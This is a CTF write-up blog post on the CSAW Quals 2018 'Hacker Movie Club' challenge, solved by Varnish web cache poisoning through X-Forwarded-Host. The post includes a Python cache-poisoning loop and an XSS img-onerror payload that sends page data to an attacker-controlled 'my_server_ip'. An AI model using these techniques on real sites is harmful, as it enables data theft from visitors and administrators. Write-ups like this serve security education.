+<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;22 Hours, 17 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;[REDACTED]&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">2018</span><span class="p">}</span></code></pre></div>
+<p><br>
+It is the only entry with <code>&quot;admin_only&quot;:true,&quot;</code> and interestingly all other movies are being displayed on the webpage but not this.
+<br></p>
+
+<h4 id="hmm-peculiar-but-why-is-it-so">Hmm, peculiar. But why is it so ?</h4>
+
+<p><br>
+Looking into the traffic in burpsuite, we notice the file <code>main.mst</code> being fetched, with the contents as :</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;header&#34;</span><span class="p">&gt;</span>
+Hacker Movie Club
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+
+{{#admin}}
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;header admin&#34;</span><span class="p">&gt;</span>
+Welcome to the desert of the real.
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+{{/admin}}
+
+<span class="p">&lt;</span><span class="nt">table</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;movies&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">thead</span><span class="p">&gt;</span>
+ <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;</span>Name<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;&lt;</span><span class="nt">th</span><span class="p">&gt;</span>Year<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;&lt;</span><span class="nt">th</span><span class="p">&gt;</span>Length<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">thead</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">tbody</span><span class="p">&gt;</span>
+{{#movies}}
+  {{^admin_only}}
+    <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{ name }}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{ year }}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{ length }}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
+  {{/admin_only}}
+{{/movies}}
+<span class="p">&lt;/</span><span class="nt">tbody</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;captcha&#34;</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;captcha&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;report&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;report&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">button</span><span class="p">&gt;</span></code></pre></div>
+<p>Well, anyone who has slight knowledge of making websites with &ldquo;new technologies&rdquo; would understand that it&rsquo;s a template file . Well now the pieces fit in, <em>mustache.min.js</em>, so perhaps mustache&rsquo;s template file. Hmmm, now the other peculiarity as to why it wasn&rsquo;t displaying the <code>[REDACTED]</code> content on the page, well it&rsquo;s quite trivial :</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">  {{^admin_only}}
+    <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{ name }}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{ year }}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{ length }}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
+  {{/admin_only}}</code></pre></div>
+<p>So, only json, with <code>admin_only</code> as <code>false</code> would be displayed here, to test this theory ( as I didn&rsquo;t know mustache and it&rsquo;s templating syntax ) , just change the response of <code>/api/movies</code> in burp suite, changing Redacted&rsquo;s <code>admin_only</code> to <code>false</code>.</p>
+
+<p><strong>And sure enough the theory checks out :</strong></p>
+
+<p>
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45612465-9ef16300-ba80-11e8-86cb-d7b2de9ad079.png" alt="The REDACTED content"/>
+    </div>
+      <figcaption>
+          <p>The REDACTED content</p>
+      </figcaption>
+    <a href="https://user-images.githubusercontent.com/17861054/45612465-9ef16300-ba80-11e8-86cb-d7b2de9ad079.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+<br>
+Okay, so now we can fairly assume that the flag is in the redacted content.
+<br></p>
+
+<h2 id="the-struggle">The Struggle</h2>
+
+<p><strong>The million dollar question</strong> : <em><strong>How do we, get the webpage the admin sees ?</strong></em>
+<br>
+I pondered many hours over this, going on and off on different questions and coming back to this but nothing came out.
+On the next day I was chatting with one of my friend ( he was also playing this CTF ) and he gave me a suggestion that maybe <strong>cache poisoning</strong> would work ( he was working that angle himself ).</p>
+
+<p>It instantly felt true, I remembered watching a talk on the same <a href="https://www.youtube.com/watch?v=mroq9eHFOIU">Web Cache Deception Attack</a> , it was from BlackHat USA 2017, quite a great research.</p>
+
+<p>So, I started devising a strategy to cache poison the admin.<br>
+Well the plan was to use a different url like : <br>
+<code>http://app.hm.vulnerable.services/?this_is_cache_poisoning</code></p>
+
+<p>Then I realized that we had no control over the url admin would go to &hellip;.<br>
+Or maybe we had, I changed the <code>Referer</code> header, thinking that maybe the admin was looking going to this url when the <code>/api/report</code> endpoint was called.</p>
+
+<p>So, I did all of that and then visited the same page ( in hopes that it would be saved in the cache ), however it was a rabbit hole and nothing could come of it.</p>
+
+<p>While looking at the headers, I had missed this <code>Cache-Control: no-cache</code>, which was effectively thwarting this.</p>
+
+<p>Back to square one &hellip; ( or maybe not )
+<br>
+The headers had these :</p>
+<div class="highlight"><pre class="chroma">~~~ SNIP ~~~
+X-Varnish: 150497792
+~~~ SNIP ~~~
+Age: 0
+~~~ SNIP ~~~</pre></div>
+<p>So, well caching was in place on the server side. Looking up the X-Varnish header and Age header on google gives the following (<a href="https://docs.acquia.com/acquia-cloud/performance/varnish/headers/">here</a>): <br></p>
+
+<blockquote>
+<p><strong>Age</strong> - The amount of time the served item was in the cache, in seconds. If the age is zero, the item was not served from the Varnish cache.<br>
+~~ SNIP ~~<br>
+<strong>X-Varnish</strong> - The ID numbers of the current request and the item request that populated the Varnish cache. If this field has only one value, the cache was populated by the request, and this is counted as a cache miss</p>
+</blockquote>
+
+<p>So, well mine was a <em>cache miss</em> and so, <code>Age</code> is 0 and only one ID in <code>X-Varnish</code> header.</p>
+
+<p>Recently I had read about web caching attack, <a href="https://portswigger.net/blog/practical-web-cache-poisoning">Practical Web Cache Poisoning</a>.
+Reading the blog, you would find in the start itself under the section <strong>Caching 101</strong> the following :</p>
+
+<blockquote>
+<p>Some companies host their own cache using software like Varnish</p>
+</blockquote>
+
+<p><em>Okay, CSAW people were also using Varnish ( but that is quite a popular caching software ) so that couldn&rsquo;t be a coincidence.</em></p>
+
+<p>In the <strong>Case Studies</strong> section under <strong>Basic Poisoning</strong> the author mentions how <strong>X-Forwarded-Host</strong> was a vulnerable parameter in case of <strong>Red Hat&rsquo;s homepage</strong> ( <em>Well two exact things matching</em> ).</p>
+
+<p><em><strong>That can&rsquo;t again be a coincidence</strong></em></p>
+
+<p>
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45614539-7b7de680-ba87-11e8-9603-41eda90af6c6.png" />
+    </div>
+    <a href="https://user-images.githubusercontent.com/17861054/45614539-7b7de680-ba87-11e8-9603-41eda90af6c6.png" itemprop="contentUrl"></a>
+  </figure>
+</div><br>It also mentioned <strong>XSS</strong> being able to perform but after checking that I realized that the parameter wasn&rsquo;t reflecting anywhere on the homepage ( so perhaps no XSS here ) .</p>
+
+<p>Thus I thought of changing the <code>X-Forwarded-Host</code> to my_server and see if it&rsquo;s reflected in .</p>
+
+<p>Now, in the <em>default configuration of burpsuite</em>, you have in the proxy options under the section <strong>Intercept Client Requests</strong> the following :</p>
+
+<p>
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45611580-8764ab00-ba7d-11e8-81b6-8a258637c7ad.png" alt="Burp Client Interception Request"/>
+    </div>
+      <figcaption>
+          <p>Burp Client Interception Request</p>
+      </figcaption>
+    <a href="https://user-images.githubusercontent.com/17861054/45611580-8764ab00-ba7d-11e8-81b6-8a258637c7ad.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+<br>
+Which says not to intercept any <strong>js</strong> file and thus initially I couldn&rsquo;t intercept js request ( I soon realized that and changed the rules accordingly )</p>
+
+<p>Now changing the <code>X-Forwarded-Host</code></p>
+
+<p>
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45613643-9ac74480-ba84-11e8-8739-8b61414644f5.png" alt="Intercepting app.js request"/>
+    </div>
+      <figcaption>
+          <p>Intercepting app.js request</p>
+      </figcaption>
+    <a href="https://user-images.githubusercontent.com/17861054/45613643-9ac74480-ba84-11e8-8739-8b61414644f5.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+<br>
+Well, that didn&rsquo;t change anything ( atleast then I thought so ). I discussed the same with my friend, he tried and he also got similar results ( the host hadn&rsquo;t changed )</p>
+<div class="highlight"><pre class="chroma">Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: HEAD, OPTIONS, GET
+Access-Control-Max-Age: 21600
+Access-Control-Allow-Headers: X-Forwarded-Host
+X-Varnish: 157368772 157916061
+Accept-Ranges: bytes
+Content-Length: 1631
+Content-Type: application/javascript
+Age: 59
+Via: 1.1 varnish-v4
+Connection: close
+Proxy-Connection: close
+
+var token = null;
+
+Promise.all([
+    fetch(&#39;/api/movies&#39;).then(r=&gt;r.json()),
+    fetch(`//3fad5c9a76928974bc36ef08fb1dfa2c98e98740.hm.vulnerable.services/cdn/main.mst`).then(r=&gt;r.text()),</pre></div>
+<h2 id="some-conclusions">Some conclusions</h2>
+
+<p>As you can see</p>
+<div class="highlight"><pre class="chroma">X-Varnish: 157368772 157916061
+~~~ SNIP ~~~
+Age: 59</pre></div>
+<p>So, it can be seen that it&rsquo;s being fetched from the cache and maybe if we hit it at the right time, we just might get it.</p>
+
+<p>Okay, much theorizing, now let&rsquo;s get our hands dirty. I initially started</p>
+
+<p>I wrote a small python script regarding the same to poison the cache :</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">X_Forwarded_Host</span> <span class="o">=</span> <span class="s1">&#39;1.2.3.4&#39;</span> 
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://3fad5c9a76928974bc36ef08fb1dfa2c98e98740.hm.vulnerable.services/cdn/app.js&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;X-Forwarded-Host&#39;</span><span class="p">:</span> <span class="n">X_Forwarded_Host</span><span class="p">})</span>
+    <span class="k">print</span> <span class="n">resp</span><span class="o">.</span><span class="n">headers</span>
+    <span class="k">if</span> <span class="n">X_Forwarded_Host</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span>
+        <span class="k">break</span></code></pre></div>
+<p>Well here&rsquo;s the output :</p>
+
+<p>
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45617609-7a04ec00-ba90-11e8-99b6-cd1825018117.png" alt="The server script output"/>
+    </div>
+      <figcaption>
+          <p>The server script output</p>
+      </figcaption>
+    <a href="https://user-images.githubusercontent.com/17861054/45617609-7a04ec00-ba90-11e8-99b6-cd1825018117.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+<br>
+We see, here the caching time is 2 minutes ( as the <code>Age</code> goes to a maximum of 120 ).
+As we can see, we can overwrite the js file here and serve our cached js file.</p>
+
+<p>
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45617198-2a71f080-ba8f-11e8-8605-710bc822c464.png" />
+    </div>
+    <a href="https://user-images.githubusercontent.com/17861054/45617198-2a71f080-ba8f-11e8-8605-710bc822c464.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+<br></p>
+
+<h2 id="the-showdown">The Showdown</h2>
+
+<p>Well, that&rsquo;s the key to the question. We will be caching the <code>app.js</code> with our server&rsquo;s IP and force the admin to retrieve the webpage, by reporting it.<br>
+Then the admin will be served our <code>app.js</code>, thus effectively fetching the <strong><em>main.mst</em></strong> file from our server.</p>
+
+<h3 id="the-strategy">The strategy</h3>
+
+<ol>
+<li>Host a <em>malicious</em> <code>main.mst</code> on your server in the <code>/cdn/</code> directory ( I hosted it on my aws instance with apache running, although ngrok would also be fine )</li>
+<li>Cache poison the server, to insert your server&rsquo;s IP there</li>
+<li>Now, report to the admin, so that admin visit&rsquo;s the page</li>
+<li>The malicious <code>main.mst</code> will phone back to the server with all the movie list ( easy peasy )</li>
+</ol>
+
+<p>Now, as I said I&rsquo;m no expert in mustache templating but it was quite easy to figure out how to get all the movie list onto our web server. It was my friend who made this template though , here&rsquo;s what it looks like :
+<br></p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;header&#34;</span><span class="p">&gt;</span>
+Hacker Movie Club
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;header admin&#34;</span><span class="p">&gt;</span>
+Welcome to the desert of the real.
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">table</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;movies&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">thead</span><span class="p">&gt;</span>
+ <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;</span>Name<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;&lt;</span><span class="nt">th</span><span class="p">&gt;</span>Year<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;&lt;</span><span class="nt">th</span><span class="p">&gt;</span>Length<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">thead</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">tbody</span><span class="p">&gt;</span>
+{{#movies}}
+    <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{ name }}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{ year }}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{ length }}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
+{{/movies}}
+<span class="p">&lt;/</span><span class="nt">tbody</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;captcha&#34;</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;captcha&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;report&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;report&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;fetch(&#39;http://my_server_ip/&#39;+&#39;{{#movies}}{{ name }}{{/movies}}&#39;)&#34;</span><span class="p">&gt;</span></code></pre></div>
+<p>It is almost all the same except with this important change ( and one other aesthetic change , the desert of the real :p ) :</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;fetch(&#39;http://my_server_ip/&#39;+&#39;{{#movies}}{{ name }}{{/movies}}&#39;)&#34;</span><span class="p">&gt;</span></code></pre></div>
+<p>So, it is typical <strong>XSS</strong> payload, where you do</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(document.cookie)</span> <span class="p">&gt;</span></code></pre></div>
+<p>However, instead of <code>document.cookie</code> we use the mustache template here to fetch the list of movies and send it to our server.</p>
+
+<p>And lo behold here&rsquo;s what we get when we open the browser just after the cache poisoning is done</p>
+
+<p>
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45617979-c56bca00-ba91-11e8-818a-d2fccc05261e.png" alt="The Poisoned Page"/>
+    </div>
+      <figcaption>
+          <p>The Poisoned Page</p>
+      </figcaption>
+    <a href="https://user-images.githubusercontent.com/17861054/45617979-c56bca00-ba91-11e8-818a-d2fccc05261e.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+<br>
+So, I went on with reporting it and looking into my server logs : <br></p>
+
+<p>
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45618302-df59dc80-ba92-11e8-8f6d-a1e57a44e4be.png" alt="Server Logs"/>
+    </div>
+      <figcaption>
+          <p>Server Logs</p>
+      </figcaption>
+    <a href="https://user-images.githubusercontent.com/17861054/45618302-df59dc80-ba92-11e8-8f6d-a1e57a44e4be.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+<br>
+A little bit of explanation :</p>
+
+<ol>
+<li><p>Here I am fetching the webpage</p></li>
+
+<li><p>The img request to steal all the movie names ( from my browser, so no flag )</p></li>
+
+<li><p>The admin visiting the page ( contains the flag )</p></li>
+</ol>
+
+<p>Here&rsquo;s the final script :</p>
+
+<script src="//gist.github.com/LuD1161/65b0d588cfbf93a94b64d0c3e76edbed.js"></script>
+
+<p>Kudos to the CSAW team for making such a good question 🎉🎉🎉</p>
+
+<h2 id="update">UPDATE :</h2>
+
+<p>I forgot to mention there was a slight issue with CORS, so I had to enable that on my apache.
+<br>
+You can do the same by following the guide <a href="https://poanchen.github.io/blog/2016/11/20/how-to-enable-cross-origin-resource-sharing-on-an-apache-server">here</a></p>
+
+<p>However instead of allowing it from only <code>s.codepen.io</code> allow it from all like this :</p>
+
+<p><code>Header set Access-Control-Allow-Origin &quot;*&quot;</code>
+<br>
+
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45640104-590fbb80-bacf-11e8-9201-29f2ff6fc03d.png" alt="My server conf"/>
+    </div>
+      <figcaption>
+          <p>My server conf</p>
+      </figcaption>
+    <a href="https://user-images.githubusercontent.com/17861054/45640104-590fbb80-bacf-11e8-9201-29f2ff6fc03d.png" itemprop="contentUrl"></a>
+  </figure>
+</div></p>
+
+
+        
+          <div class="blog-tags">
+            
+              <a href="https://lud1161.github.io//tags/web-cache-poisoning/">web cache poisoning</a>&nbsp;
+            
+              <a href="https://lud1161.github.io//tags/ctf/">ctf</a>&nbsp;
+            
+              <a href="https://lud1161.github.io//tags/csaw-2018/">csaw-2018</a>&nbsp;
+            
+              <a href="https://lud1161.github.io//tags/writeup/">writeup</a>&nbsp;
+            
+          </div>
+        
+
+        
+            <hr/>
+            <section id="social-share">
+              <ul class="list-inline footer-links">
+                
+
+
+<li>
+    <a href="//twitter.com/share?url=https%3a%2f%2flud1161.github.io%2fposts%2fhacker-movie-club-csaw-quals-2018%2f&amp;text=Hacker%20Movie%20Club%20CSAW%20Quals%202018&amp;via=LuD1161"
+       target="_blank" alt="" title="Share on Twitter">
+        <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//plus.google.com/share?url=https%3a%2f%2flud1161.github.io%2fposts%2fhacker-movie-club-csaw-quals-2018%2f" target="_blank" title="Share on Google Plus">
+         <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-google-plus fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2flud1161.github.io%2fposts%2fhacker-movie-club-csaw-quals-2018%2f" target="_blank" title="Share on Facebook">
+        <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//reddit.com/submit?url=https%3a%2f%2flud1161.github.io%2fposts%2fhacker-movie-club-csaw-quals-2018%2f&amp;title=Hacker%20Movie%20Club%20CSAW%20Quals%202018" target="_blank" title="Share on Reddit">
+         <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-reddit fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2flud1161.github.io%2fposts%2fhacker-movie-club-csaw-quals-2018%2f&amp;title=Hacker%20Movie%20Club%20CSAW%20Quals%202018" target="_blank"
+       title="Share on LinkedIn">
+         <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2flud1161.github.io%2fposts%2fhacker-movie-club-csaw-quals-2018%2f&amp;title=Hacker%20Movie%20Club%20CSAW%20Quals%202018" target="_blank"
+       title="Share on StumbleUpon">
+        <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-stumbleupon fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2flud1161.github.io%2fposts%2fhacker-movie-club-csaw-quals-2018%2f&amp;description=Hacker%20Movie%20Club%20CSAW%20Quals%202018" target="_blank"
+       title="Share on Pinterest">
+         <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-pinterest fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+              </ul>
+            </section>
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://lud1161.github.io/posts/cat-chat-googlectf-writeup/" data-toggle="tooltip" data-placement="top" title="Cat Chat Google-CTF &#39;18 Writeup">&larr; Previous Post</a>
+            </li>
+          
+          
+        </ul>
+      
+
+
+      
+        
+          <div class="disqus-comments">
+            <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "lud1161-github-io" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+          </div>
+        
+        
+      
+
+    </div>
+  </div>
+</div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://www.facebook.com/AseemShrey" title="Facebook">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://github.com/LuD1161" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/LuD1161" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://linkedin.com/in/aseem-shrey-18b08526" title="LinkedIn">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://www.youtube.com/channel/UCdmYjIVJArISn6Eo7RoVdLQ" title="Youtube">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-youtube fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://keybase.io/aseemshrey" title="Keybase">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-key fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            
+            <a href="https://lud1161.github.io/index.xml" title="RSS">
+            
+              <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              Aseem Shrey
+            
+          
+
+          &nbsp;&bull;&nbsp;
+          2018
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://lud1161.github.io/">LuD1161&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="http://gohugo.io">Hugo v0.45.1</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
